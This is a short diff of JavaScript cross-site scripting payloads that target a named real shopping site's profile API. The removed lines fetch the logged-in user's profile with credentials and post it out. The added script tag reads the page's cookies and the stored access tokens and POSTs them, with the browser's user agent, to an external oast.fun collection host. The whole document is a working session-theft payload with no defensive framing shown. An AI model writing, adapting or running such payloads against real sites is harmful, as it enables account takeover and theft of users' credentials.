@@ -1,10 +1,13 @@
-fetch('https://sociolla.com/api/profile', {
-  credentials: 'include'
-})
-.then(res => res.text())
-.then(html => {
-  fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+<script>
+(async () => {
+  const cookie = document.cookie;
+  const token = localStorage.getItem('token') || sessionStorage.getItem('access_token');
+
+  await fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
     method: 'POST',
-    body: html
+    body: new URLSearchParams({
+      cookie, token, ua: navigator.userAgent
+    })
   });
-});
+})();
+</script>
